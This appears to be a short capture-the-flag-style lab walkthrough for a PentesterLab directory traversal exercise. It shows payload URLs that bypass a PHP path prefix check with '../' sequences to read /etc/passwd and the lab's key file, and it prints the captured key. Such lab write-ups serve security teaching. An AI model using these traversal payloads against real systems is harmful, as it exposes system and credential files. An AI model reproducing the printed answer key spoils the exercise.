In this example, you can see that the full path is used to access the file. However, if you try to just replace it with /etc/passwd, you won't get anything. It looks like a simple check is performed by the PHP code. 
You can however bypass it by keeping the beginning of the path and add your payload at the end, to go up and back down within the file system.

 You can access this exercise using the following URL: http://ptc-bd1616fb-d1377fd5.libcurl.so/. 

 Steps:
    1)  Visit the given url: http://ptc-bd1616fb-d1377fd5.libcurl.so/.
    2)  We can see image in the page now open image in new tab. We can see: http://ptc-bd1616fb-d1377fd5.libcurl.so/file.php?file=/var/www/hacker.png
    3)    Now replace the hacker.png with  /etc/passwd some parameter changes:
            http://ptc-bd1616fb-d1377fd5.libcurl.so/file.php?file=/var/www/../../../../etc/passwd
    4)  Replace etc/passwd with /pentesterlab.key:
             http://ptc-bd1616fb-d1377fd5.libcurl.so/file.php?file=/var/www/../../../../pentesterlab.key
            The key is: 9a1e3a4c-22a2-4eae-89d2-90a9523d6956 
    5)     Bravo!! you have finished this exercise! 

            Happy Hacking!! :)
